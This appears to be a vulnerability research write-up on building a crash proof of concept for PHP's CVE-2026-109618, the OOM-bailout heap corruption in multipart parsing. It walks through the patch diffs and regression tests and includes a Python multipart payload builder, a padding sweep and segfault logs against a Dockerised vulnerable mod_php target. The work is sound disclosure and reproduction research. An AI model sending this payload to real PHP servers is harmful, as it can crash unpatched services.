# From a CVE advisory to a working crash PoC: reverse-engineering CVE-2026-109618 (PHP2Shell)

> A field notebook on how I turned two paragraphs of advisory text into a
> reproducible, Docker-contained memory-corruption demonstration against
> Apache `mod_php` — including every dead end, the actual patch diff, and the
> padding-sweep trick that finally made it crash.

*Date: 2026-10-27 · Topic: PHP internals, memory corruption, CVE-2026-109618 / CVE-2026-109619 ("PHP2Shell")*

---

## 0. TL;DR

CVE-2026-109618 is a critical (CVSS v4.0 **9.2**) memory-safety bug in the PHP
runtime. PHP aborted requests on out-of-memory by `longjmp()`ing from inside the
allocator; if that happened mid-way through multipart request parsing, the
parser left partially-initialized state behind, and request shutdown read/freed
it, producing heap corruption — exploitable for unauthenticated RCE on
`mod_php`, *before any application code runs*.

The hard part of writing a PoC wasn't the trigger *concept* — the advisory even
lists the amplification vectors — it was finding the **specific allocation site**
where the bailout actually corrupts state rather than just producing a clean
fatal error. The answer was hiding in php-src's own regression tests, and the
technique is a **padding sweep** that walks the OOM point across each step of
the `$_FILES` registration path.

The final PoC crashes a vulnerable PHP 8.4.26 worker with a ~1.7 MB multipart
body, and the identical body against patched 8.4.27 returns a clean "Allowed
memory size exhausted" error. Everything runs in Docker.

---

## 1. What I started with

The task: *"generate a POC for CVE-2026-109618 … the POC should run in docker,
including the simulated target."*

Two files were provided:

- `prompt.md` — just ten URLs (the GitHub advisories, the cve.org records, the
  oss-security post, the Rapid7 and Wiz and Unit 42 write-ups).
- `detail.md` — a synthesis of those sources. The important parts:

  > CVE-2026-109618 concerns **partially initialized data being used after an
  > out-of-memory interruption**; CVE-2026-109619 concerns **stale state
  > surviving after the memory it references has been freed**.

  > Palo Alto Networks describes the underlying control-flow issue as involving
  > **`longjmp()` during out-of-memory handling**.

  > Crafted multipart requests — the format commonly used for forms and file
  > uploads — can exhaust PHP memory even when their apparent size satisfies
  > configured PHP input limits.

  > Apache `mod_php` performs cleanup even when PHP request startup fails. This
  > enables the demonstrated sequence to run before application code executes.

That's a *mechanism sketch*, not an exploit recipe. It tells you where to look
(the OOM unwind path, multipart parsing, `mod_php`) but not which line of C to
aim at. So the first job was to get the actual patch.

---

## 2. Finding the patch (and why it matters)

I did a couple of web searches and landed on the fix commit. The mainline
commit is **`01a40e89fb`**, titled **"Avoid state corruption via bailout"**,
with branch variants (`506e87fa7d` on 8.4, `712e60f9ed` as a 7.4 backport).

A security fix commit is the single most valuable artifact for building a PoC:
the diff is a negative image of the vulnerability. Every line the fix *adds* is
a spot the old code got wrong.

The commit is enormous — **389 files**, ~700 KB of diff. But it decomposes into
three conceptual changes:

1. **The allocator** (`Zend/zend_alloc.c`, `zend_alloc.h`) — replace
   "bailout on OOM" with a *delayed* OOM + a *fallible* allocation API + a
   *hard* limit.
2. **The multipart parser** (`main/rfc1867.c`) — sprinkle `ZEND_HAS_OOM()`
   checks through the parsing and `$_FILES` registration so it can stop cleanly
   instead of longjmp-ing out mid-structure.
3. **The session upload-progress handler** (`ext/session/session.c`) — the
   CVE-2026-109619 half of the state-corruption story.

Let me walk through each, because the bug only makes sense once you see both
the *before* and the *after*.

---

## 3. The vulnerable allocator: `zend_bailout()` is the bug

Here is the **old** OOM handler, deleted by the fix:

```c
static ZEND_COLD ZEND_NORETURN void zend_mm_safe_error(zend_mm_heap *heap,
    const char *format, size_t limit,
#if ZEND_DEBUG
    const char *filename, uint32_t lineno,
#endif
    size_t size)
{
    heap->overflow = 1;
    zend_try {
        zend_error_noreturn(E_ERROR, format, limit, ..., size);
    } zend_catch {
    } zend_end_try();
    heap->overflow = 0;
    zend_bailout();   // <-- longjmp() out of the allocator
    exit(1);
}
```

`zend_bailout()` is PHP's `setjmp`/`longjmp` escape hatch: it unwinds to the
nearest `zend_try` handler and abandons the current C call stack. Crucially, it
**does not run destructors, and it does not clean up whatever the caller of
`emalloc()` was in the middle of building.**

That's fine if the caller of `emalloc()` was doing something idempotent. It's
catastrophic if the caller was, say, half-way through inserting a bucket into a
`HashTable`, or half-way through building the `$_FILES` superglobal. The `longjmp`
skips the assignment of a pointer, leaves a count incremented, or leaves a
`char *buffer` member pointing at memory that was just freed — and then the
request-shutdown code runs over that stale state.

The new code turns this inside out. Instead of `longjmp`-ing immediately, it:

```c
static zend_always_inline zend_result zend_mm_check_limit(zend_mm_heap *heap,
    size_t add_size, bool gc, bool *did_gc ZEND_FILE_LINE_DC)
{
    if (UNEXPECTED(heap->limit < heap->real_size || add_size > heap->limit - heap->real_size)) {
        if (gc && zend_mm_gc(heap)) { ... }
        if (!heap->fallible && add_size > heap->hard_limit - heap->real_size) {
            zend_mm_hard_limit_error(heap, add_size ...);   // _exit(137)
        }
        if (!ZEND_HAS_OOM()) {
            zend_mm_delayed_error("Allowed memory size of %zu bytes exhausted ...", ...);
        }
        return heap->fallible ? FAILURE : SUCCESS;
    }
    return SUCCESS;
}
```

The three pillars of the fix, in one function:

- **`delayed OOM`** — instead of bailing out, it records the error in
  `EG(delayed_oom)` (a `zend_oom_info` with states `NONE → PENDING → HANDLING →
  HANDLED`) and sets a VM interrupt. The fatal error is then raised at the
  *next safe VM point*, after the C-level caller has had a chance to check
  `ZEND_HAS_OOM()` and unwind gracefully.
- **`fallible` allocation** — the new `femalloc` / `fecalloc` / `ferealloc` /
  `safe_ferealloc` API returns `NULL` on OOM instead of bailing out, so the
  caller can branch on failure.
- **`hard_limit`** — above a second threshold (default: 2× `memory_limit`, or a
  fixed 1 GB buffer for large limits), it stops pretending and `_exit(137)`s
  rather than corrupting memory. (A separate `ZEND_MM_MAX_ALLOCS` test hook
  exits with status `121`.)

`ZEND_HAS_OOM()` is just `EG(delayed_oom).state != ZEND_OOM_STATE_NONE`.

So the mental model: **old PHP = longjmp out of `emalloc` anywhere, including
into half-built state. New PHP = defer the error to a safe point, give callers
a fallible API, and hard-kill rather than corrupt.**

---

## 4. The corrupting path: `main/rfc1867.c`

`rfc1867_post_handler()` is what parses `multipart/form-data`. It runs during
`php_request_startup`, i.e. **before RINIT and before any application code**.

The fix's diff to `rfc1867.c` (+215 lines) is almost entirely mechanical: turn
every helper from `void` into `bool`, and after every allocation, `if
(ZEND_HAS_OOM()) goto fileupload_done;`.

For example, `safe_php_register_variable`:

```c
- static void safe_php_register_variable(char *var, char *strval, size_t val_len,
-                                        zval *track_vars_array, bool override_protection)
+ static bool safe_php_register_variable(char *var, char *strval, size_t val_len,
+                                        zval *track_vars_array, bool override_protection)
  {
      if (override_protection || !is_protected_variable(var)) {
          php_register_variable_safe(var, strval, val_len, track_vars_array);
      }
+     return !ZEND_HAS_OOM();
  }
```

`php_register_variable_safe` ultimately calls `zend_hash_update` on `$_POST` /
`$_FILES`. A `zend_hash_update` does multiple `emalloc`s — a bucket, a key
`zend_string`, possibly a table resize. In the old code, if *any one* of those
failed, `zend_bailout` fired, `zend_hash_update` never returned, and the
`HashTable` could be left with `nNumUsed` already bumped or a resize in flight.
Request shutdown then ran `zend_hash_destroy` on a table that was internally
inconsistent → heap corruption.

And the file-upload path is where it's most dangerous, because a single part
does a *sequence* of registrations — `name`, `full_path`, `type`, `tmp_name`,
`error`, `size` — each with its own `lbuf`/`abuf`/`array_index` scratch buffers
and `add_protected_variable()` calls:

```c
- register_http_post_files_variable(lbuf, s, &PG(http_globals)[TRACK_VARS_FILES], 0);
+ if (!register_http_post_files_variable(lbuf, s, &PG(http_globals)[TRACK_VARS_FILES], 0)) {
+     goto oom_with_filename;
+ }
```

The `goto` chains (`oom_with_filename`, `oom_with_param`) are the fix making the
parser *fail safely* — the vulnerable code simply had no such path.

---

## 5. The sibling bug in `ext/session/session.c`

CVE-2026-109619 is the cross-request stale-state half, but it shares DNA, and
the session diff explains one of the amplification vectors. The default-on
`session.upload_progress` handler runs *during* multipart parsing and decodes /
re-encodes the session on every chunk.

The fix adds `PS(in_rfc1867_update)` and, while it's set, forces the
serializer/deserializer into "incomplete classes only" mode — no autoloading, no
`__wakeup()`/`__unserialize()` — because this all runs before RINIT when no user
code may run:

```c
static void php_session_unserialize_init(php_unserialize_data_t *var_hash)
{
    PHP_VAR_UNSERIALIZE_INIT(*var_hash);
    if (PS(in_rfc1867_update)) {
        php_var_unserialize_set_incomplete_classes_only(*var_hash, true);
    }
}
```

And the callback gets a guard that skips it entirely after module activation:

```c
if (PG(modules_activated)) {
    /* request_parse_body(). Do not run here as it corrupts the session. */
    return retval;
}
```

That comment — "Do not run here as it corrupts the session" — is as close to a
smoking gun as patch comments get.

---

## 6. The gold mine: the regression tests

The commit ships **~77 OOM regression tests**, mostly `Zend/tests/oom_*.phpt`
and `tests/basic/oom_rfc1867_*.phpt`. These are effectively the *author's own
reproduction recipes*, written in PHP. The multipart ones all share a harness
(`tests/basic/oom_rfc1867.inc`) that:

1. builds a multipart body on disk,
2. runs it through `php-cgi` with `memory_limit=8M` and *every input limit
   raised* (`post_max_size=1G`, `max_file_uploads=1000000`,
   `max_multipart_body_parts=10000000`, …) so that **only `memory_limit` bounds
   what the parser accumulates**,
3. prints what came back.

That "raise every limit except memory" is a crucial detail I carried into my own
`target/php2shell.ini`.

The individual tests map to the amplification vectors from the advisory:

| Test | Amplification vector |
|---|---|
| `oom_rfc1867_header_count.phpt` | unlimited per-part headers; PHP stores each as hash + key + value |
| `oom_rfc1867_field_name.phpt` | huge form-field name |
| `oom_rfc1867_files.phpt` | huge number of file parts → `$_FILES` metadata growth |
| `oom_rfc1867_array_upload_name.phpt` | nested field names → `lbuf`/`abuf`/`array_index` copies |
| `oom_rfc1867_upload_progress.phpt` | session upload progress re-encode |
| `oom_rfc1867_files_registration.phpt` | **OOM at each step of `$_FILES` registration** |

That last one turned out to be the corruption trigger — but I didn't know that
yet. First I naively tried the others and hit a wall.

---

## 7. Building the target, and my first dead end

The simulated target is the SAPI the advisory singles out: **Apache `mod_php`**.
The official Docker images still serve old patch-level tags, so:

- vulnerable: `php:8.4.26-apache-bookworm`  (`8.4.26` < `8.4.27`)
- patched:   `php:8.4.27-apache-bookworm`

I added a drop-in `php2shell.ini` (low `memory_limit`, high parser limits,
`display_errors=On`), a trivial `index.php`, and I `rm`-ed the image's log
symlinks so Apache writes real files I can share with the PoC container for
segfault evidence.

Then I ported the straightforward triggers — `header_count`, `field_name`,
`files`, `upload_progress` — to Python and fired them at the vulnerable box.

Result: **all of them returned a clean `HTTP 200`** with:

```
Fatal error: Allowed memory size of 8388608 bytes exhausted (tried to allocate ...)
```

No crash. No segfault. The worker survived.

This is the single most important lesson of the whole exercise: **not every OOM
is the corruption.** Most allocation sites, when they bail out, happen to leave
consistent state. The clean fatal error *is* what a *correctly handled* OOM
looks like — and PHP has always produced it in the common case. The CVE is
about the *specific sites* where the bailout lands mid-structure. I had the
amplification right but was aiming at the wrong allocation.

---

## 8. The breakthrough: padding, and `$_FILES` registration

`oom_rfc1867_files_registration.phpt` is subtitled *"reaching the soft limit at
each step of the `$_FILES` registration"*. Its trick is **padding**: first send
a `pad` form field of size `padKb` to bring memory *just below* the limit, then
a file upload whose field name is ~700 KB so that the *next* allocation is the
one that trips over — at a different registration step depending on `padKb`.

Why the sweep? The test comments it outright:

> How much padding it takes to leave a given amount of room depends on how the
> allocator accounts memory: Zend MM counts whole chunks, while the tracked
> allocator used under ASan counts exact sizes.

In other words, **the corruption window is a function of allocator bookkeeping,
so no single magic value exists** — you have to sweep. The test uses
`padKb ∈ {200, 292, 636, 1340}` for Zend MM.

I implemented the same shape:

```python
def payload_files_registration(pad_kb, name_kb=700):
    out  = [_part('Content-Disposition: form-data; name="pad"', "A" * (pad_kb * 1024))]
    out += [("--" + BOUNDARY + "\r\n").encode(),
            b'Content-Disposition: form-data; name="',
            b"A" * (name_kb * 1024),
            b'[k]"; filename="f.txt"\r\nContent-Type: text/plain\r\n\r\nx\r\n',
            _close()]
    return b"".join(out)
```

The wire body is about **1.7 MB**, yet it deterministically lands the OOM
inside `$_FILES` registration.

Then I swept `pad_kb` from 0 to 3000 in steps of 64 and watched the response
classifier:

```
pad=    0 KB -> OK
pad=   64 KB -> OK
pad=  128 KB -> OOM
...
pad=  640 KB -> CRASH(empty)
pad=  704 KB -> OOM
...
pad=  960 KB -> CRASH(empty)
pad= 1024 KB -> CRASH(empty)
pad= 1088 KB -> CRASH(empty)
pad= 1152 KB -> OOM
pad= 1216 KB -> CRASH(empty)
pad= 1280 KB -> CRASH(empty)
pad= 1344 KB -> OOM
...
```

`CRASH(empty)` = the worker died before sending anything (the connection closed
with no bytes). And Apache's error log confirmed exactly what was happening:

```
[core:notice] [pid 1:tid 1] AH00051: child pid 19 exit signal Segmentation fault (11), possible coredump in /etc/apache2
[core:notice] [pid 1:tid 1] AH00051: child pid 21 exit signal Segmentation fault (11), possible coredump in /etc/apache2
[core:notice] [pid 1:tid 1] AH00051: child pid 34 exit signal Segmentation fault (11), possible coredump in /etc/apache2
...
```

One segfault per crash-window hit. That's the memory corruption.

---

## 9. The differential (the part that makes it a *proof*)

A crash on a vulnerable build is suggestive; a crash that *disappears* on the
patched build under identical input is a proof. I built 8.4.27 from the same
Dockerfile (just a different `PHP_IMAGE` arg) and ran the **identical sweep**:

- **vulnerable (8.4.26):** 5 crash windows (`pad_kb` 960, 1024, 1088, 1152, 1216)
- **patched (8.4.27):** 0 crashes across the entire 0–3000 KB sweep — every
  request returns the clean `Allowed memory size exhausted` fatal error.

That asymmetry — same bytes, different memory-safety behavior, version-pinned to
the exact fix boundary — is the whole PoC.

---

## 10. The final architecture

```
docker-compose.yml
  vulnerable   php:8.4.26-apache-bookworm + php2shell.ini + index.php   (port 8080)
  patched      php:8.4.27-apache-bookworm + same files                  (port 8081)
  poc          python:3.12-slim, stdlib-only exploit.py                 (one-shot)
  volumes      apache_logs_vuln / apache_logs_patched → shared with poc (read-only)
```

`poc/exploit.py` is deliberately **dependency-free** (raw sockets, so a
`ConnectionResetError` / empty reply is visible directly rather than hidden
behind an HTTP library). It has:

- five payload builders (`files_registration` being the corruption trigger, the
  rest being amplification demonstrations),
- a raw HTTP/1.1 client with crash classification,
- a `--verify` mode that sweeps padding against both targets and greps the
  shared Apache logs for `Segmentation fault`.

Running `docker compose up --build` prints:

```
[*] CVE-2026-109618 differential test
[*] payload : files_registration (pad sweep 512..1408 step 64, name=700KB)
[*] vulnerable : vulnerable:80
[*] patched    : patched:80

vulnerable: 5 crash(es) at pad_kb=[960, 1024, 1088, 1152, 1216] ; log shows 5 'Segmentation fault' line(s)
patched   : 0 crash(es) at pad_kb=[]

[+] VULNERABLE build segfaults on the crafted multipart body;
    the PATCHED build handles the same body cleanly.
    => CVE-2026-109618 memory corruption reproduced.
```

---

## 11. Honest limitations

A blog that only reports wins would be lying by omission. So:

- **This is a crash PoC, not RCE.** The memory corruption is the primitive; a
  working RCE needs heap shaping to turn "freed a stale pointer" into "control
  of `rip`". Rapid7 and Wiz both describe the RCE as narrow/laboratory-only.
  I make the PoC say this explicitly rather than over-claiming.
- **The corruption window is non-deterministic across a single fixed padding
  value.** A lone `--pad 1024` request may land as a clean OOM depending on the
  worker's allocator state; that's why the PoC (like php-src's own test)
  *sweeps*. Anyone who says "send this one packet and you get a shell" is
  overselling it.
- **`memory_limit` is 8M for demo speed.** The advisory's exploit used default
  128M; the same trigger scales up proportionally. I document this rather than
  pretend 8M is a realistic production default.
- **mod_php vs FPM matters.** The pre-RINIT path only fully lands on `mod_php`;
  FPM kills the worker on startup failure. This PoC targets `mod_php` for that
  reason.

---

## 12. What I'd tell someone trying the same thing

1. **Get the patch.** The diff is the negative image of the bug, and the
   accompanying regression tests are the author's own reproducers. This saved
   me from guessing.
2. **Read the *tests*, not just the C code.** The `oom_rfc1867_*.phpt` files
   encode the "raise every limit except memory, then pad" technique that turned
   out to be the whole trick.
3. **Distinguish "clean OOM" from "corruption."** A `Fatal error: Allowed
   memory size exhausted` HTTP 200 is the *patched* behavior. The crash is the
   signal. If you only see clean errors, you're at the wrong allocation site —
   keep looking, don't assume the bug is fixed.
4. **Do a differential.** A crash on the vulnerable build is anecdote; the same
   input not crashing on the adjacent patched build is evidence.
5. **Be honest about scope.** Crash ≠ RCE, and a single magic payload that
   always works doesn't exist here. Say so.

---

## 13. References

- [CVE-2026-109618 — cve.org](https://www.cve.org/CVERecord?id=CVE-2026-109618)
- [PHP advisory GHSA-w8hw-w9fx-j79w (RCE via OOM corruption)](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [PHP advisory GHSA-6wmf-4rv5-p3rp (CVE-2026-109619)](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [php-src fix commit 01a40e89fb "Avoid state corruption via bailout"](https://github.com/php/php-src/commit/01a40e89fb)
- [Google Cloud — responding to the core PHP vulnerabilities](https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619)
- [Rapid7 — CVE-2026-109618 / CVE-2026-109619](https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php/)
- [Palo Alto Networks / Unit 42](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/)
- [Wiz — php2shell PHP RCE](https://www.wiz.io/blog/php2shell-php-rce)
- [oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/10/21/6)
